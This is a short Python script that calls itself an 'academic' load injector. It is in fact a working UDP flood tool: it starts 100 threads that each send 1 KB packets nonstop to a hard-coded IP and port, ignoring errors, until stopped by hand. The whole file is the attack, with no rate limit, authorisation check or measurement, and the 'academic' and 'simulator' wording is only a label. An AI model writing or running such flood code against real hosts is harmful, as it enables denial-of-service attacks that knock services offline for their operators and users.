import threading
import socket
import time

TARGET_IP = "192.168.0.1"
TARGET_PORT = 80
TOTAL_THREADS = 100

print("==================================================")
print("   HIGH-SPEED SOCKET LOAD INJECTOR (ACADEMIC)     ")
print("==================================================")
print(f"[*] Targeting IP: {TARGET_IP} on Port: {TARGET_PORT}")
print(f"[*] Spawning {TOTAL_THREADS} raw UDP flooding threads...")
print("[*] Press 'Control + C' to STOP the generator.")
print("--------------------------------------------------")

def send_raw_traffic():
    """Generates continuous raw UDP payload blast without handshake overhead"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = b"X" * 1024  # 1 KB payload per packet
    
    while True:
        try:
            s.sendto(bytes_payload, (TARGET_IP, TARGET_PORT))
        except Exception:
            pass

# Spawn concurrent worker threads
threads = []
for i in range(TOTAL_THREADS):
    t = threading.Thread(target=send_raw_traffic)
    t.daemon = True
    threads.append(t)
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Traffic simulator stopped cleanly.")